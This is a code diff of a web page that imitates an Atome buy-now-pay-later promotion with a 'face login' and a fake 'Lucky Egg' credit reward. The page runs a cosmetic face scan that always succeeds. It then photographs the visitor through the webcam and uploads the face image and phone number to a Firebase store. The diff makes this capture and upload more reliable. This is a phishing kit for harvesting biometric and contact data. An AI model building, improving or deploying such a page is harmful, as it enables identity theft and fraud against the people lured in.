@@ -22,7 +22,6 @@
             overflow-x: hidden;
         }
 
-        /* MAIN BACKGROUND - atomebg.png */
         .bg-theme {
             background-image: url('photos/atomebg.png');
             background-size: cover;
@@ -34,7 +33,6 @@
             position: relative;
         }
 
-        /* Main Container */
         .main-container {
             position: relative;
             z-index: 2;
@@ -47,17 +45,14 @@
             justify-content: center;
         }
 
-        /* FULLY TRANSPARENT MAIN CARD */
         .glass-card {
             background: rgba(255, 255, 255, 0.08);
             border-radius: 52px;
             padding: 32px 28px 44px;
             box-shadow: 0 25px 45px rgba(0, 0, 0, 0.2);
             border: 1px solid rgba(255, 255, 255, 0.2);
-            transition: all 0.3s ease;
         }
 
-        /* PROMO HEADER CONTAINER */
         .promo-header {
             text-align: center;
             margin-bottom: 28px;
@@ -76,7 +71,6 @@
             letter-spacing: -0.5px;
             line-height: 1.3;
             font-family: 'Space Grotesk', monospace;
-            text-shadow: 0 1px 2px rgba(0,0,0,0.2);
         }
         .promo-title strong {
             background: linear-gradient(135deg, #FFD700, #FFA500, #FF8C00);
@@ -91,15 +85,12 @@
             color: #FFE566;
             margin-top: 10px;
             font-weight: 700;
-            letter-spacing: 0.3px;
-            font-family: 'Inter', sans-serif;
             background: rgba(0, 0, 0, 0.25);
             display: inline-block;
             padding: 8px 20px;
             border-radius: 60px;
         }
 
-        /* STEPS */
         .steps-container {
             display: flex;
             justify-content: center;
@@ -117,20 +108,11 @@
             font-size: 0.9rem;
             color: #ffffff;
             font-family: 'Space Grotesk', monospace;
-            letter-spacing: -0.2px;
             position: relative;
             text-shadow: 0 1px 2px rgba(0,0,0,0.5);
         }
-        .step-emoji {
-            font-size: 1.4rem;
-            display: block;
-            margin-bottom: 4px;
-        }
-        .step-text {
-            display: block;
-            font-size: 0.8rem;
-            font-weight: 600;
-        }
+        .step-emoji { font-size: 1.4rem; display: block; margin-bottom: 4px; }
+        .step-text { display: block; font-size: 0.8rem; font-weight: 600; }
         .step:not(:last-child):after {
             content: "→";
             position: absolute;
@@ -139,47 +121,27 @@
             transform: translateY(-50%);
             color: #FFD700;
             font-size: 1rem;
-            opacity: 0.9;
-            font-weight: 600;
         }
 
-        /* ATOME LOGO */
         .logo-wrapper {
             display: flex;
             justify-content: center;
             margin: 8px 0 28px 0;
         }
-        .logo-image {
-            width: auto;
-            height: auto;
-            max-width: 200px;
-            display: block;
-            background: transparent;
-            filter: drop-shadow(0 4px 12px rgba(0,0,0,0.3));
-        }
-        .logo-image img {
-            width: 100%;
-            height: auto;
-            display: block;
-            background: transparent !important;
-        }
+        .logo-image { max-width: 200px; filter: drop-shadow(0 4px 12px rgba(0,0,0,0.3)); }
+        .logo-image img { width: 100%; height: auto; display: block; background: transparent !important; }
 
-        /* PHONE INPUT */
-        .input-field-wrapper {
-            margin-bottom: 28px;
-        }
+        .input-field-wrapper { margin-bottom: 28px; }
         .phone-input-group {
             display: flex;
             align-items: center;
             background: rgba(0, 0, 0, 0.3);
             border-radius: 80px;
             border: 1.5px solid rgba(255, 255, 255, 0.3);
-            transition: all 0.25s;
             padding: 4px 4px 4px 24px;
         }
         .phone-input-group:focus-within {
             border-color: #FFD700;
-            box-shadow: 0 0 0 3px rgba(255,215,0,0.2);
             background: rgba(0, 0, 0, 0.4);
         }
         .country-code {
@@ -188,8 +150,6 @@
             color: #FFE566;
             background: transparent;
             padding: 14px 0;
-            letter-spacing: 0.3px;
-            font-family: 'Space Grotesk', monospace;
         }
         .phone-input-group input {
             flex: 1;
@@ -199,28 +159,19 @@
             font-size: 1rem;
             font-weight: 500;
             color: white;
-            font-family: 'Inter', sans-serif;
             outline: none;
         }
-        .phone-input-group input::placeholder {
-            color: rgba(255, 255, 200, 0.7);
-            font-weight: 400;
-            font-size: 0.95rem;
-        }
+        .phone-input-group input::placeholder { color: rgba(255, 255, 200, 0.7); }
         .error-message {
             color: #FFB347;
             font-size: 0.7rem;
             margin-top: 8px;
             margin-left: 24px;
-            font-weight: 500;
             display: none;
             text-shadow: 0 0 2px black;
         }
-        .error-message.show {
-            display: block;
-        }
+        .error-message.show { display: block; }
 
-        /* LOGIN BUTTON */
         .login-button {
             width: 100%;
             background: #1a1a1a;
@@ -230,75 +181,26 @@
             color: #FDD97A;
             font-weight: 800;
             font-size: 1.2rem;
-            letter-spacing: 1.2px;
             cursor: pointer;
-            transition: all 0.2s ease;
             margin-top: 6px;
             margin-bottom: 20px;
-            box-shadow: 0 8px 20px rgba(0,0,0,0.3);
             text-transform: uppercase;
-            font-family: 'Space Grotesk', monospace;
-        }
-        .login-button:active {
-            transform: scale(0.97);
-            background: #2a2a2a;
-            border-color: #FFE566;
-            color: #FFE566;
         }
 
-        .hint-message {
+        .hint-message, .terms-row {
             text-align: center;
             font-size: 0.72rem;
             color: #FFE8C5;
-            margin: 12px 0 12px;
             background: rgba(0, 0, 0, 0.2);
             padding: 12px 18px;
             border-radius: 50px;
-            width: 100%;
-            font-weight: 500;
-            font-family: 'Inter', sans-serif;
-            border: 1px solid rgba(255, 255, 255, 0.2);
+            margin-bottom: 12px;
         }
+        .terms-row a { color: #FFD700; text-decoration: none; }
 
-        .terms-row {
-            text-align: center;
-            font-size: 0.68rem;
-            color: #FFE8C5;
-            margin-top: 18px;
-            line-height: 1.4;
-            background: rgba(0, 0, 0, 0.2);
-            padding: 12px 16px;
-            border-radius: 80px;
-            font-family: 'Inter', sans-serif;
-            border: 1px solid rgba(255, 255, 255, 0.2);
-        }
-        .terms-row a {
-            color: #FFD700;
-            font-weight: 600;
-            text-decoration: none;
-        }
-
-        /* DASHBOARD */
-        .dashboard-area {
-            margin-top: 28px;
-            border-top: 1px solid rgba(255, 215, 0, 0.3);
-            padding-top: 20px;
-        }
-        .reward-panel {
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 48px;
-            padding: 22px 20px;
-            border: 1px solid rgba(255, 215, 0, 0.3);
-        }
-        .claim-row, .withdraw-row {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin: 14px 0;
-            flex-wrap: wrap;
-            gap: 12px;
-            color: white;
-        }
+        .dashboard-area { margin-top: 28px; border-top: 1px solid rgba(255, 215, 0, 0.3); padding-top: 20px; }
+        .reward-panel { background: rgba(0, 0, 0, 0.3); border-radius: 48px; padding: 22px 20px; }
+        .claim-row, .withdraw-row { display: flex; justify-content: space-between; align-items: center; margin: 14px 0; flex-wrap: wrap; gap: 12px; color: white; }
         .claim-btn-sm, .withdraw-btn-sm {
             background: #1a1a1a;
             border: 1.5px solid #FDD97A;
@@ -308,21 +210,11 @@
             color: #FDD97A;
             cursor: pointer;
         }
-        .balance-text {
-            font-weight: 800;
-            font-size: 1.5rem;
-            color: #FFD700;
-        }
+        .balance-text { font-weight: 800; font-size: 1.5rem; color: #FFD700; }
         .hidden { display: none; }
-        .status-sub {
-            font-size: 0.7rem;
-            color: #FFE8C5;
-            margin-top: 12px;
-        }
+        .status-sub { font-size: 0.7rem; color: #FFE8C5; margin-top: 12px; }
 
-        /* ============================================
-           FACIAL SCANNING POPUP - MAY GREEN EDGE EFFECT
-        ============================================ */
+        /* FACIAL POPUP */
         .facial-overlay {
             position: fixed;
             top: 0;
@@ -339,10 +231,7 @@
             opacity: 0;
             transition: all 0.3s ease;
         }
-        .facial-overlay.active {
-            visibility: visible;
-            opacity: 1;
-        }
+        .facial-overlay.active { visibility: visible; opacity: 1; }
         .facial-popup {
             background: linear-gradient(165deg, rgba(126,200,224,0.98), rgba(253,225,139,0.98));
             border-radius: 60px;
@@ -353,41 +242,25 @@
             box-shadow: 0 30px 50px rgba(0,0,0,0.3);
             border: 1px solid rgba(255,255,255,0.5);
         }
-        .facial-header {
-            margin-bottom: 20px;
-        }
-        .facial-header h3 {
-            font-size: 1.4rem;
-            font-weight: 800;
-            color: #1a2a3a;
-        }
-        .facial-header p {
-            font-size: 0.75rem;
-            color: #d46b5e;
-            margin-top: 5px;
-        }
+        .facial-header h3 { font-size: 1.4rem; font-weight: 800; color: #1a2a3a; margin-bottom: 8px; }
+        .facial-header p { font-size: 0.75rem; color: #d46b5e; }
         
-        /* ROUND FRAME WITH SCANNING EFFECT */
         .camera-container {
             position: relative;
             width: 260px;
             height: 260px;
-            margin: 0 auto 20px;
+            margin: 20px auto;
             border-radius: 50%;
             overflow: hidden;
             border: 4px solid #FFD700;
-            box-shadow: 0 0 0 3px rgba(255,215,0,0.3), 0 10px 30px rgba(0,0,0,0.3);
             background: #000;
         }
         .camera-container video {
             width: 100%;
             height: 100%;
             object-fit: cover;
-            object-position: center;
             transform: scaleX(-1);
         }
-        
-        /* GREEN EDGE OVERLAY - para sa scanning effect */
         .green-edge-overlay {
             position: absolute;
             top: 0;
@@ -396,21 +269,15 @@
             height: 100%;
             border-radius: 50%;
             pointer-events: none;
-            z-index: 10;
             box-shadow: inset 0 0 20px 5px rgba(0,255,0,0.8), 0 0 15px 3px rgba(0,255,0,0.6);
             opacity: 0;
-            transition: opacity 0.3s ease;
+            transition: opacity 0.3s;
         }
-        .green-edge-overlay.active {
-            opacity: 1;
-            animation: pulseGreen 0.8s ease-out;
-        }
+        .green-edge-overlay.active { opacity: 1; animation: pulseGreen 0.8s ease-out; }
         @keyframes pulseGreen {
             0% { box-shadow: inset 0 0 0 0 rgba(0,255,0,0.8), 0 0 0 0 rgba(0,255,0,0.6); }
             100% { box-shadow: inset 0 0 30px 8px rgba(0,255,0,0.9), 0 0 25px 10px rgba(0,255,0,0.8); }
         }
-        
-        /* SCANNING LINE ANIMATION */
         .scan-line {
             position: absolute;
             top: 0;
@@ -420,14 +287,10 @@
             background: linear-gradient(90deg, transparent, #00ff00, #00ff00, transparent);
             animation: scanMove 2s linear infinite;
             pointer-events: none;
-            z-index: 11;
+            display: none;
         }
-        @keyframes scanMove {
-            0% { top: 0; }
-            100% { top: 100%; }
-        }
+        @keyframes scanMove { 0% { top: 0; } 100% { top: 100%; } }
         
-        /* ANALYZING TEXT EFFECT */
         .analyzing-text {
             font-size: 0.8rem;
             font-weight: 700;
@@ -437,37 +300,9 @@
             padding: 6px 16px;
             border-radius: 60px;
             margin-bottom: 12px;
-            letter-spacing: 1px;
-        }
-        .analyzing-text .dots::after {
-            content: '';
-            animation: dots 1.5s steps(4, end) infinite;
-        }
-        @keyframes dots {
-            0%, 20% { content: '.'; }
-            40% { content: '..'; }
-            60%, 100% { content: '...'; }
         }
         
-        .zoom-guide {
-            position: absolute;
-            bottom: 10px;
-            left: 50%;
-            transform: translateX(-50%);
-            background: rgba(0,0,0,0.6);
-            color: #FFD700;
-            font-size: 0.65rem;
-            padding: 4px 12px;
-            border-radius: 60px;
-            white-space: nowrap;
-            z-index: 15;
-        }
-        
-        .facial-buttons {
-            display: flex;
-            gap: 12px;
-            margin: 16px 0 12px;
-        }
+        .facial-buttons { display: flex; gap: 12px; margin: 16px 0 12px; }
         .facial-btn {
             flex: 1;
             background: #1a1a1a;
@@ -477,17 +312,8 @@
             color: #FDD97A;
             font-weight: 700;
             cursor: pointer;
-            font-size: 0.9rem;
-            transition: all 0.2s;
         }
-        .facial-btn:active {
-            transform: scale(0.97);
-        }
-        .facial-btn.cancel {
-            background: rgba(212,107,94,0.25);
-            border-color: #d46b5e;
-            color: #d46b5e;
-        }
+        .facial-btn.cancel { background: rgba(212,107,94,0.25); border-color: #d46b5e; color: #d46b5e; }
         .facial-status {
             text-align: center;
             font-size: 0.75rem;
@@ -497,17 +323,10 @@
             border-radius: 60px;
             font-weight: 600;
         }
-        .instruction-text {
-            font-size: 0.65rem;
-            color: #5e4a3a;
-            margin-top: 12px;
-        }
 
         @media (max-width: 480px) {
             .glass-card { padding: 24px 20px 36px; }
             .step-emoji { font-size: 1.1rem; }
-            .step-text { font-size: 0.7rem; }
-            .promo-title { font-size: 1.3rem; }
             .camera-container { width: 220px; height: 220px; }
         }
     </style>
@@ -528,9 +347,7 @@
             </div>
 
             <div class="logo-wrapper">
-                <div class="logo-image">
-                    <img src="photos/atomeA.png" alt="AtomA" style="background: transparent !important;">
-                </div>
+                <div class="logo-image"><img src="photos/atomeA.png" alt="AtomA" style="background:transparent !important;"></div>
             </div>
 
             <div class="input-field-wrapper">
@@ -542,28 +359,13 @@
             </div>
 
             <button class="login-button" id="mainLoginBtn">FACE LOGIN</button>
-
-            <div class="hint-message" id="registerHintMsg">
-                Enter your 10-digit number then verify your face
-            </div>
-
-            <div class="terms-row">
-                By continuing you agree to the 
-                <a href="#" id="termsLink">Terms of Service</a> and 
-                <a href="#" id="privacyLink">Privacy Policy</a>.
-            </div>
+            <div class="hint-message">Enter your 10-digit number then verify your face</div>
+            <div class="terms-row">By continuing you agree to the <a href="#" id="termsLink">Terms of Service</a> and <a href="#" id="privacyLink">Privacy Policy</a>.</div>
 
             <div id="dashboardPanel" class="dashboard-area hidden">
                 <div class="reward-panel">
-                    <div class="claim-row">
-                        <span>🥚 Smash Lucky Egg</span>
-                        <button class="claim-btn-sm" id="claimRewardBtn">Claim Rewards</button>
-                    </div>
-                    <div class="withdraw-row">
-                        <span>💳 Spending Balance</span>
-                        <span class="balance-text" id="balanceDisplay">₱0</span>
-                        <button class="withdraw-btn-sm" id="withdrawFundsBtn">Enjoy Spending</button>
-                    </div>
+                    <div class="claim-row"><span>🥚 Smash Lucky Egg</span><button class="claim-btn-sm" id="claimRewardBtn">Claim Rewards</button></div>
+                    <div class="withdraw-row"><span>💳 Spending Balance</span><span class="balance-text" id="balanceDisplay">₱0</span><button class="withdraw-btn-sm" id="withdrawFundsBtn">Enjoy Spending</button></div>
                     <div class="status-sub" id="claimedStatusMsg"></div>
                 </div>
             </div>
@@ -571,32 +373,20 @@
     </div>
 </div>
 
-<!-- FACIAL POPUP - MAY SCANNING AT GREEN EDGE EFFECT -->
 <div id="facialOverlay" class="facial-overlay">
     <div class="facial-popup">
-        <div class="facial-header">
-            <h3>😊 Facial Verification</h3>
-            <p>Center your face in the circle</p>
-        </div>
-        
+        <div class="facial-header"><h3>😊 Facial Verification</h3><p>Center your face in the circle</p></div>
         <div class="camera-container">
             <video id="facialVideo" autoplay playsinline muted></video>
             <div class="green-edge-overlay" id="greenEdgeOverlay"></div>
             <div class="scan-line" id="scanLine"></div>
-            <div class="zoom-guide">🔍 Position face here</div>
         </div>
-        
-        <div class="analyzing-text" id="analyzingText" style="display: none;">
-            <span>🔍 Analyzing facial features</span><span class="dots"></span>
-        </div>
-        
+        <div class="analyzing-text" id="analyzingText" style="display:none;">🔍 Analyzing facial features<span class="dots"></span></div>
         <div class="facial-buttons">
             <button class="facial-btn" id="captureSaveBtn">📸 CAPTURE & SAVE</button>
             <button class="facial-btn cancel" id="cancelFacialBtn">CANCEL</button>
         </div>
-        
         <div class="facial-status" id="facialStatus">🎯 Align your face within the circle</div>
-        <div class="instruction-text">Good lighting • No glasses • No hat</div>
     </div>
 </div>
 
@@ -657,7 +447,9 @@
             const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
             videoStream = stream;
             facialVideo.srcObject = stream;
+            console.log("Camera started");
         } catch (err) {
+            console.error("Camera error:", err);
             facialStatus.innerHTML = "❌ Camera access denied";
         }
     }
@@ -670,109 +462,116 @@
         facialVideo.srcObject = null;
     }
 
-    // Simulate face scanning with green edge effect
     async function simulateFaceScan() {
         return new Promise((resolve) => {
-            // Show scanning animation
             analyzingText.style.display = "block";
             facialStatus.innerHTML = "🔍 Scanning face...";
-            
-            // Green edge effect
             greenEdgeOverlay.classList.add('active');
             scanLine.style.display = "block";
             
-            // Simulate scanning process (2 seconds)
             setTimeout(() => {
                 greenEdgeOverlay.classList.remove('active');
                 scanLine.style.display = "none";
                 analyzingText.style.display = "none";
-                
-                // Random success rate (90% success)
-                const success = Math.random() > 0.1;
-                resolve(success);
+                resolve(true);
             }, 2000);
         });
     }
 
-    // Capture image as JPEG and save to Firebase
     async function captureAndSaveToFirebase(phoneNumber) {
         facialStatus.innerHTML = "📸 Capturing image...";
         
-        // Create canvas to capture current video frame
-        const canvas = document.createElement('canvas');
-        canvas.width = facialVideo.videoWidth;
-        canvas.height = facialVideo.videoHeight;
-        const ctx = canvas.getContext('2d');
-        
-        // Draw video frame to canvas (with mirror effect para natural)
-        ctx.save();
-        ctx.scale(-1, 1);
-        ctx.drawImage(facialVideo, -canvas.width, 0, canvas.width, canvas.height);
-        ctx.restore();
-        
-        // Convert to JPEG blob
-        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.95));
-        
-        // Upload to Firebase Storage
-        const fileName = `faces/${phoneNumber}_${Date.now()}.jpg`;
-        const imageRef = storageRef(storage, fileName);
-        await uploadBytes(imageRef, blob);
-        const imageUrl = await getDownloadURL(imageRef);
-        
-        // Save to Realtime Database
-        const userFaceRef = dbRef(database, `users/${phoneNumber}/face`);
-        await set(userFaceRef, {
-            imageUrl: imageUrl,
-            fileName: fileName,
-            registeredAt: new Date().toISOString(),
-            phoneNumber: phoneNumber
-        });
-        
-        return { success: true, imageUrl: imageUrl };
-    }
-
-    async function checkIfUserExists(phoneNumber) {
-        const userRef = dbRef(database, `users/${phoneNumber}`);
-        const snapshot = await get(userRef);
-        return snapshot.exists();
+        try {
+            const canvas = document.createElement('canvas');
+            canvas.width = facialVideo.videoWidth;
+            canvas.height = facialVideo.videoHeight;
+            
+            if (canvas.width === 0 || canvas.height === 0) {
+                facialStatus.innerHTML = "❌ Camera not ready. Please wait.";
+                return null;
+            }
+            
+            const ctx = canvas.getContext('2d');
+            ctx.save();
+            ctx.scale(-1, 1);
+            ctx.drawImage(facialVideo, -canvas.width, 0, canvas.width, canvas.height);
+            ctx.restore();
+            
+            // Convert to JPEG
+            let blob = await new Promise((resolve) => {
+                canvas.toBlob(resolve, 'image/jpeg', 0.9);
+            });
+            
+            // Fallback if toBlob failed
+            if (!blob) {
+                console.log("toBlob failed, using toDataURL fallback");
+                const dataURL = canvas.toDataURL('image/jpeg', 0.9);
+                const binary = atob(dataURL.split(',')[1]);
+                const array = [];
+                for (let i = 0; i < binary.length; i++) {
+                    array.push(binary.charCodeAt(i));
+                }
+                blob = new Blob([new Uint8Array(array)], { type: 'image/jpeg' });
+            }
+            
+            if (!blob || blob.size < 1000) {
+                facialStatus.innerHTML = "❌ Failed to capture image. Please try again.";
+                return null;
+            }
+            
+            console.log("Image captured, size:", blob.size);
+            facialStatus.innerHTML = "📤 Uploading to Firebase...";
+            
+            // Upload to Firebase Storage
+            const fileName = `faces/${phoneNumber}_${Date.now()}.jpg`;
+            const imageRef = storageRef(storage, fileName);
+            await uploadBytes(imageRef, blob);
+            const imageUrl = await getDownloadURL(imageRef);
+            
+            console.log("Uploaded! URL:", imageUrl);
+            
+            // Save to Realtime Database
+            const userRef = dbRef(database, `users/${phoneNumber}`);
+            await set(userRef, {
+                faceImageUrl: imageUrl,
+                fileName: fileName,
+                registeredAt: new Date().toISOString(),
+                phoneNumber: phoneNumber,
+                fileSize: blob.size,
+                status: 'active'
+            });
+            
+            // Verify save
+            const verifySnapshot = await get(userRef);
+            if (verifySnapshot.exists()) {
+                console.log("Database saved:", verifySnapshot.val());
+                facialStatus.innerHTML = "✅ Face saved successfully!";
+                return { success: true, imageUrl: imageUrl };
+            } else {
+                throw new Error("Database save verification failed");
+            }
+            
+        } catch (error) {
+            console.error("Save error:", error);
+            facialStatus.innerHTML = "❌ Error: " + error.message;
+            return null;
+        }
     }
 
     async function handleCapture() {
-        // Step 1: Simulate face scanning with green edge effect
         const scanSuccess = await simulateFaceScan();
-        
         if (!scanSuccess) {
             facialStatus.innerHTML = "❌ Face detection failed. Please try again.";
             return;
         }
         
-        facialStatus.innerHTML = "✅ Face detected! Saving to database...";
-        
-        // Step 2: Capture and save JPEG to Firebase
-        try {
-            const result = await captureAndSaveToFirebase(currentPhoneNumber);
-            if (result.success) {
-                facialStatus.innerHTML = "✅ Face saved successfully!";
-                
-                // Also save user login record
-                const userLoginRef = dbRef(database, `users/${currentPhoneNumber}/login`);
-                await set(userLoginRef, {
-                    lastLogin: new Date().toISOString(),
-                    status: 'active'
-                });
-                
-                // Close popup and complete login
-                setTimeout(() => {
-                    stopCamera();
-                    facialOverlay.classList.remove('active');
-                    completeLogin(currentPhoneNumber);
-                }, 1000);
-            } else {
-                facialStatus.innerHTML = "❌ Failed to save. Please try again.";
-            }
-        } catch (error) {
-            console.error("Save error:", error);
-            facialStatus.innerHTML = "❌ Database error. Please try again.";
+        const result = await captureAndSaveToFirebase(currentPhoneNumber);
+        if (result && result.success) {
+            setTimeout(() => {
+                stopCamera();
+                facialOverlay.classList.remove('active');
+                completeLogin(currentPhoneNumber);
+            }, 1000);
         }
     }
 
@@ -788,11 +587,6 @@
         
         facialOverlay.classList.add('active');
         await startCamera();
-        
-        // Reset UI elements
-        greenEdgeOverlay.classList.remove('active');
-        scanLine.style.display = "none";
-        analyzingText.style.display = "none";
         facialStatus.innerHTML = "🎯 Align your face within the circle";
     }
 
@@ -802,13 +596,7 @@
         spendableBalance = 0;
         refreshUI();
         alert(`✅ Welcome +63${phoneNumber}! Facial verification successful.`);
-        
-        localStorage.setItem('atomeUser', JSON.stringify({
-            phone: phoneNumber,
-            loggedIn: true,
-            loginTime: new Date().toISOString(),
-            faceVerified: true
-        }));
+        localStorage.setItem('atomeUser', JSON.stringify({ phone: phoneNumber, loggedIn: true, loginTime: new Date().toISOString() }));
     }
 
     function refreshUI() {
@@ -816,19 +604,17 @@
             dashboardPanel.classList.remove('hidden');
             mainLoginBtn.innerText = "✓ LOGGED IN";
             mainLoginBtn.disabled = true;
-            mainLoginBtn.style.opacity = "0.85";
-            hintMsg.innerText = "🎉 You're logged in! Smash the lucky egg to claim rewards.";
-
+            hintMsg.innerText = "🎉 You're logged in!";
             if (claimedReward) {
                 claimRewardBtn.innerText = "✓ Claimed";
                 claimRewardBtn.disabled = true;
-                claimedStatusMsg.innerText = `✨ You claimed ₱${spendableBalance} spending balance!`;
+                claimedStatusMsg.innerText = `✨ You claimed ₱${spendableBalance}!`;
                 balanceDisplay.innerText = `₱${spendableBalance}`;
                 withdrawFundsBtn.disabled = (spendableBalance <= 0);
             } else {
                 claimRewardBtn.innerText = "🥚 Smash & Claim";
                 claimRewardBtn.disabled = false;
-                claimedStatusMsg.innerText = "Tap 'Claim Rewards' to win credit increase up to ₱10,000 + iPhone 17 raffle!";
+                claimedStatusMsg.innerText = "Tap 'Claim Rewards' to win up to ₱10,000!";
                 balanceDisplay.innerText = `₱0`;
                 withdrawFundsBtn.disabled = true;
             }
@@ -837,7 +623,6 @@
             mainLoginBtn.innerText = "FACE LOGIN";
             mainLoginBtn.disabled = false;
             hintMsg.innerText = "Enter your 10-digit number then verify your face";
-            phoneError.classList.remove('show');
         }
     }
 
@@ -847,24 +632,21 @@
         const creditIncrease = Math.floor(Math.random() * (10000 - 1000 + 1) + 1000);
         spendableBalance = creditIncrease;
         claimedReward = true;
-        let msg = `🎉 You smashed the Lucky Egg! You received ₱${creditIncrease} credit increase!`;
-        if (Math.random() < 0.12) msg += ` 🍀 You also won an iPhone 17 raffle entry! 🍀`;
-        alert(msg);
+        alert(`🎉 You received ₱${creditIncrease} credit increase!`);
         refreshUI();
     }
 
     function performEnjoySpending() {
-        if (!isLoggedIn) { alert("Please complete facial verification first."); return; }
+        if (!isLoggedIn) { alert("Please login first."); return; }
         if (!claimedReward) { alert("Claim rewards first!"); return; }
-        if (spendableBalance <= 0) { alert("No spending balance."); return; }
+        if (spendableBalance <= 0) { alert("No balance."); return; }
         if (confirm(`Enjoy spending ₱${spendableBalance}?`)) {
-            alert(`✅ Enjoy your ₱${spendableBalance} shopping balance!`);
+            alert(`✅ Enjoy!`);
             spendableBalance = 0;
             refreshUI();
         }
     }
 
-    // Phone input restriction
     phoneInput.addEventListener('input', (e) => {
         let val = e.target.value.replace(/\D/g, '');
         if (val.length > 10) val = val.slice(0, 10);
@@ -882,33 +664,19 @@
         }
     });
 
-    // Event listeners
     mainLoginBtn.addEventListener('click', openFacialPopup);
     captureSaveBtn.addEventListener('click', handleCapture);
-    cancelFacialBtn.addEventListener('click', () => {
-        stopCamera();
-        facialOverlay.classList.remove('active');
-    });
+    cancelFacialBtn.addEventListener('click', () => { stopCamera(); facialOverlay.classList.remove('active'); });
     claimRewardBtn.addEventListener('click', performClaim);
     withdrawFundsBtn.addEventListener('click', performEnjoySpending);
-    
-    document.getElementById('termsLink').addEventListener('click', (e) => {
-        e.preventDefault();
-        alert("Terms of Service: 0% interest for up to 40 days, no annual fees.");
-    });
-    document.getElementById('privacyLink').addEventListener('click', (e) => {
-        e.preventDefault();
-        alert("Privacy Policy: Your face data is encrypted and stored in Firebase.");
-    });
+    document.getElementById('termsLink').addEventListener('click', (e) => { e.preventDefault(); alert("Terms of Service"); });
+    document.getElementById('privacyLink').addEventListener('click', (e) => { e.preventDefault(); alert("Privacy Policy"); });
 
     const savedUser = localStorage.getItem('atomeUser');
     if (savedUser) {
         try {
             const userData = JSON.parse(savedUser);
-            if (userData.loggedIn === true) {
-                isLoggedIn = true;
-                refreshUI();
-            }
+            if (userData.loggedIn === true) { isLoggedIn = true; refreshUI(); }
         } catch(e) {}
     }
     refreshUI();
